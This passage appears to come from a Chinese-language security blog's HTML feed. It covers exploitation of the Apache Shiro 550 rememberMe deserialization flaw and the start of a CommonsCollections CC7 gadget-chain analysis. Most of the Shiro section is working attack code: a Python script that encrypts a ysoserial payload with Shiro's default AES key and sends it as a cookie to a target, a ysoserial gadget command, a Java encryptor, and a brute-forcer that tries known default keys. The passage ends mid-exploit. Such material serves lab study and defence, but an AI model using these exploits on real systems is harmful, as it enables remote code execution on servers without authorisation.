class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_file_data</span>(<span class="hljs-params">filename</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        data = f.read()<br>    <span class="hljs-keyword">return</span> data<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_enc</span>(<span class="hljs-params">data</span>):<br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(data)))<br>    <span class="hljs-keyword">return</span> ciphertext<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">aes_dec</span>(<span class="hljs-params">enc_data</span>):<br>    enc_data = base64.b64decode(enc_data)<br>    unpad = <span class="hljs-keyword">lambda</span> s: s[:-s[-<span class="hljs-number">1</span>]]<br>    key = <span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span><br>    mode = AES.MODE_CBC<br>    iv = enc_data[:<span class="hljs-number">16</span>]<br>    encryptor = AES.new(base64.b64decode(key), mode, iv)<br>    plaintext = encryptor.decrypt(enc_data[<span class="hljs-number">16</span>:])<br>    plaintext = unpad(plaintext)<br>    <span class="hljs-keyword">return</span> plaintext<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    data = get_file_data(<span class="hljs-string">&quot;ser.bin&quot;</span>)<br>    secret = base64.b64decode(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>)<br><br>    ciphertext = aes_enc(data)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;ser.bin.enc&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(ciphertext)<br><br>    url = <span class="hljs-string">&quot;http://192.168.88.148:8080&quot;</span><br><br>    cookie = &#123;<span class="hljs-string">&quot;rememberMe&quot;</span> : ciphertext.decode(<span class="hljs-string">&quot;utf-8&quot;</span>)&#125;<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;start&quot;</span>)<br>    requests.get(url, cookies=cookie)<br></code></pre></td></tr></table></figure><h3 id="java脚本-vulhub"><a href="#java脚本-vulhub" class="headerlink" title="java脚本(vulhub)"></a>java脚本(vulhub)</h3><p>使用ysoserial生成CommonsBeanutils1的Gadget：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">java </span>-<span class="hljs-keyword">jar </span>ysoserial-master<span class="hljs-number">-30099844</span>c6<span class="hljs-number">-1</span>.<span class="hljs-keyword">jar </span>CommonsBeanutils1 <span class="hljs-string">&quot;touch /tmp/success&quot;</span> &gt; poc.ser<br></code></pre></td></tr></table></figure><p>使用Shiro内置的默认密钥对Payload进行加密：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.vulhub.shirodemo;<br><br><span class="hljs-keyword">import</span> org.apache.shiro.crypto.AesCipherService;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.CodecSupport;<br><span class="hljs-keyword">import</span> org.apache.shiro.util.ByteSource;<br><span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<br><span class="hljs-keyword">import</span> org.apache.shiro.io.DefaultSerializer;<br><br><span class="hljs-keyword">import</span> java.nio.file.FileSystems;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TestRemember</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(FileSystems.getDefault().getPath(<span class="hljs-string">&quot;/path&quot;</span>, <span class="hljs-string">&quot;to&quot;</span>, <span class="hljs-string">&quot;poc.ser&quot;</span>));<br><br>        <span class="hljs-type">AesCipherService</span> <span class="hljs-variable">aes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AesCipherService</span>();<br>        <span class="hljs-type">byte</span>[] key = Base64.decode(CodecSupport.toBytes(<span class="hljs-string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span>));<br><br>        <span class="hljs-type">ByteSource</span> <span class="hljs-variable">ciphertext</span> <span class="hljs-operator">=</span> aes.encrypt(payloads, key);<br>        System.out.printf(ciphertext.toString());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><h3 id="CC11-链"><a href="#CC11-链" class="headerlink" title="CC11 链"></a>CC11 链</h3><h3 id="CB1链"><a href="#CB1链" class="headerlink" title="CB1链"></a>CB1链</h3><h3 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h3><p><a href="https://github.com/safe6Sec/ShiroExp">https://github.com/safe6Sec/ShiroExp</a></p><h2 id="识别"><a href="#识别" class="headerlink" title="识别"></a>识别</h2><h4 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h4><p>在请求包的 Cookie 中为 <code>rememberMe</code> 字段赋任意值，收到返回包的 Set-Cookie 中存在 <code>rememberMe=deleteMe</code> 字段，说明目标有使用 Shiro 框架</p><h4 id="AES密钥判断"><a href="#AES密钥判断" class="headerlink" title="AES密钥判断"></a>AES密钥判断</h4><p>Shiro 1.2.4 以上版本官方移除了代码中的默认密钥，要求开发者自己设置，如果开发者没有设置，则默认动态生成，降低了固定密钥泄漏的风险。 </p><p>如何判断密钥正确？当密钥不正确或类型转换异常时，目标 Response 包含 <code>Set-Cookie：rememberMe=deleteMe</code> 字段，而当密钥正确且没有类型转换异常时，返回包不存在 <code>Set-Cookie：rememberMe=deleteMe</code> 字段。</p><p>shiro 在 1.4.2 版本之前， AES 的模式为 CBC， IV 是随机生成的，并且 IV 并没有真正使用起来，所以整个 AES 加解密过程的 key 就很重要了，正是因为 AES 使用 Key 泄漏导致反序列化的 cookie 可控，从而引发反序列化漏洞。在 1.4.2 版本后，shiro 已经更换加密模式 AES-CBC 为 AES-GCM，脚本编写时需要考虑加密模式变化的情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> uuid<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encrypt_AES_GCM</span>(<span class="hljs-params">msg, secretKey</span>):<br>    aesCipher = AES.new(secretKey, AES.MODE_GCM)<br>    ciphertext, authTag = aesCipher.encrypt_and_digest(msg)<br>    <span class="hljs-keyword">return</span> (ciphertext, aesCipher.nonce, authTag)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_rememberme</span>(<span class="hljs-params">target</span>):<br>    keys = [<span class="hljs-string">&#x27;kPH+bIxk5D2deZiIxcaaaA==&#x27;</span>, <span class="hljs-string">&#x27;4AvVhmFLUs0KTA3Kprsdag==&#x27;</span>,<span class="hljs-string">&#x27;66v1O8keKNV3TTcGPK1wzg==&#x27;</span>, <span class="hljs-string">&#x27;SDKOLKn2J1j/2BHjeZwAoQ==&#x27;</span>]     <span class="hljs-comment"># 此处简单列举几个密钥</span><br>    BS = AES.block_size<br>    pad = <span class="hljs-keyword">lambda</span> s: s + ((BS - <span class="hljs-built_in">len</span>(s) % BS) * <span class="hljs-built_in">chr</span>(BS - <span class="hljs-built_in">len</span>(s) % BS)).encode()<br>    mode = AES.MODE_CBC<br>    iv = uuid.uuid4().<span class="hljs-built_in">bytes</span><br> <br>    file_body = base64.b64decode(<span class="hljs-string">&#x27;rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBwdwEAeA==&#x27;</span>)<br>    <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> keys:<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># CBC加密</span><br>            encryptor = AES.new(base64.b64decode(key), mode, iv)<br>            base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(pad(file_body)))<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;,timeout=<span class="hljs-number">3</span>,verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY ：&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-comment"># GCM加密</span><br>            encryptedMsg = encrypt_AES_GCM(file_body, base64.b64decode(key))<br>            base64_ciphertext = base64.b64encode(encryptedMsg[<span class="hljs-number">1</span>] + encryptedMsg[<span class="hljs-number">0</span>] + encryptedMsg[<span class="hljs-number">2</span>])<br>            res = requests.get(target, cookies=&#123;<span class="hljs-string">&#x27;rememberMe&#x27;</span>: base64_ciphertext.decode()&#125;, timeout=<span class="hljs-number">3</span>, verify=<span class="hljs-literal">False</span>, allow_redirects=<span class="hljs-literal">False</span>)<br> <br>            <span class="hljs-keyword">if</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>) == <span class="hljs-literal">None</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确KEY:&quot;</span> + key)<br>                <span class="hljs-keyword">return</span> key<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;rememberMe=deleteMe;&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res.headers.get(<span class="hljs-string">&quot;Set-Cookie&quot;</span>):<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>                    <span class="hljs-keyword">return</span> key<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;正确key:&quot;</span> + key)<br>            <span class="hljs-keyword">return</span> key<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>            <span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><h2 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h2><p>因为对python写脚本不是很熟练，而且python的弱类型，自己看代码++难度。脚本都是借鉴的其他大佬的。</p><p>这是一个shiro的CVE-2010-3863漏洞，复现很简单，没细看原理。</p><p><img src="/2025/04/12/shiro550/image-20250410210108921.png" alt="image-20250410210108921"></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
            <tag> shiro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-CC7</title>
      <link href="/2025/04/02/Java-CC7/"/>
      <url>/2025/04/02/Java-CC7/</url>
      
        <content type="html"><![CDATA[<p>CC7</p><p>与CC5类似，后半还是<code>LazyMap.get()</code>链子</p><p>直接看<a href="####%E9%93%BE%E5%AD%90">链子</a>，get()确实很多调用的</p><h3 id="java-util-AbstractMap"><a href="#java-util-AbstractMap" class="headerlink" title="java.util.AbstractMap"></a>java.util.AbstractMap</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-type">boolean</span> <span class="hljs-title function_">equals</span><span class="hljs-params">(Object o)</span> &#123;<br>    <span class="hljs-keyword">if</span> (o == <span class="hljs-built_in">this</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br><br>    <span class="hljs-keyword">if</span> (!(o <span class="hljs-keyword">instanceof</span> Map))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;<br>    <span class="hljs-keyword">if</span> (m.size() != size())<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br><br>    <span class="hljs-keyword">try</span> &#123;<br>        Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();<br>        <span class="hljs-keyword">while</span> (i.hasNext()) &#123;<br>            Entry&lt;K,V&gt; e = i.next();<br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> e.getKey();<br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> e.getValue();<br>            <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>                <span class="hljs-keyword">if</span> (!(m.get(key)==<span class="hljs-literal">null</span> &amp;&amp; m.containsKey(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">if</span> (!value.equals(m.get(key)))<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (ClassCastException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125; <span class="hljs-keyword">catch</span> (NullPointerException unused) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">size</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-keyword">return</span> entrySet().size();<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是第三个<code>if</code>比较，这里会比较传入map和原map的大小</p><h3 id="java-util-Hashtable"><a href="#java-util-Hashtable" class="headerlink" title="java.util.Hashtable"></a>java.util.Hashtable</h3><p>入口：java.util.Hashtable#readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>     <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException<br>&#123;<br>    s.defaultReadObject();<br>    <br>    <span class="hljs-comment">//hashtable序列化时的大小</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">origlength</span> <span class="hljs-operator">=</span> s.readInt();<br>    <span class="hljs-comment">//Hashtable 存储的 键值对个数</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">elements</span> <span class="hljs-operator">=</span> s.readInt();<br><br>    <span class="hljs-type">int</span> <span class="hljs-variable">length</span> <span class="hljs-operator">=</span> (<span class="hljs-type">int</span>)(elements * loadFactor) + (elements / <span class="hljs-number">20</span>) + <span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">if</span> (length &gt; elements &amp;&amp; (length &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>)<br>        length--;<br>    <span class="hljs-keyword">if</span> (origlength &gt; <span class="hljs-number">0</span> &amp;&amp; length &gt; origlength)<br>        length = origlength;<br>    table = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;?,?&gt;[length];<br>    threshold = (<span class="hljs-type">int</span>)Math.min(length * loadFactor, MAX_ARRAY_SIZE + <span class="hljs-number">1</span>);<br>    count = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">// 逐个读取键值对</span><br>    <span class="hljs-keyword">for</span> (; elements &gt; <span class="hljs-number">0</span>; elements--) &#123;<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">K</span> <span class="hljs-variable">key</span> <span class="hljs-operator">=</span> (K)s.readObject();<br>        <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>            <span class="hljs-type">V</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> (V)s.readObject();<br>        <span class="hljs-comment">// synch could be eliminated for performance</span><br>        reconstitutionPut(table, key, value);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>reconstitutionPut</code>是比较关键的地方。在第12行触发链子，需要满足前一个条件的成立 <code>e.hash == hash</code>，<code>e.key</code>为一个lazymap。</p><p>因为他是将<code>tab</code>中的每一个元素都拿出来对比，所以需要至少传入两个元素。存入元素使用的是put方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">reconstitutionPut</span><span class="hljs-params">(Entry&lt;?,?&gt;[] tab, K key, V value)</span><br>    <span class="hljs-keyword">throws</span> StreamCorruptedException<br>&#123;<br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    <span class="hljs-comment">// This should not happen in deserialized version.</span><br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="hljs-literal">null</span> ; e = e.next) &#123;<br>        <span class="hljs-keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.StreamCorruptedException();<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// Creates the new entry.</span><br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>        Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)tab[index];<br>    tab[index] = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Entry</span>&lt;&gt;(hash, key, value, e);<br>    count++;<br>&#125;<br></code></pre></td></tr></table></figure><p>因为反序列化时要触发 <code>reconstitutionPut()</code>中的 <code>(e.hash == hash) &amp;&amp; e.key.equals(key)</code>，我们传入的值的<code>hashcode</code>，要冲突，才会触发equals。但是存在一点小问题需要解决。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> V <span class="hljs-title function_">put</span><span class="hljs-params">(K key, V value)</span> &#123;<br>    <span class="hljs-comment">// Make sure the value is not null</span><br>    <span class="hljs-keyword">if</span> (value == <span class="hljs-literal">null</span>) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">NullPointerException</span>();<br>    &#125;<br>    <span class="hljs-comment">// Makes sure the key is not already in the hashtable.</span><br>    Entry&lt;?,?&gt; tab[] = table;<br>    <span class="hljs-type">int</span> <span class="hljs-variable">hash</span> <span class="hljs-operator">=</span> key.hashCode();<br>    <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> (hash &amp; <span class="hljs-number">0x7FFFFFFF</span>) % tab.length;<br>    <span class="hljs-meta">@SuppressWarnings(&quot;unchecked&quot;)</span><br>    Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)tab[index];<br>    <span class="hljs-keyword">for</span>(; entry != <span class="hljs-literal">null</span> ; entry = entry.next) &#123;<br>        <span class="hljs-keyword">if</span> ((entry.hash == hash) &amp;&amp; entry.key.equals(key)) &#123;<br>            <span class="hljs-type">V</span> <span class="hljs-variable">old</span> <span class="hljs-operator">=</span> entry.value;<br>            entry.value = value;<br>            <span class="hljs-keyword">return</span> old;<br>        &#125;<br>    &#125;<br>    addEntry(hash, key, value, index);<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="yy和zZ"><a href="#yy和zZ" class="headerlink" title="yy和zZ"></a>yy和zZ</h4><p>两个值的hashcode相等，为什么不直接存入两个相同的值，因为在使用put存入键值对的时候，两个相同的key是不行的。</p><p><img src="/2025/04/02/Java-CC7/image-20250402195716790-174472650632511.png" alt="image-20250402195716790"></p><p>但是第二次put的时候，会触发equals，会在 <code>org.apache.commons.collections.map.LazyMap#get</code>时加入新的键值对，与CC6中类似。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;<br>    <span class="hljs-comment">// create value for key if key is not currently in the map</span><br>    <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);<br>        map.put(key, value);<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">return</span> map.get(key);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="remove-“yy”"><a href="#remove-“yy”" class="headerlink" title="remove(“yy”)"></a>remove(“yy”)</h4><p>需要remove这一步骤，因为在 <a href="###java.util.AbstractMap">java.util.AbstractMap#equals</a>处会比较两个lazymap的大小。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> 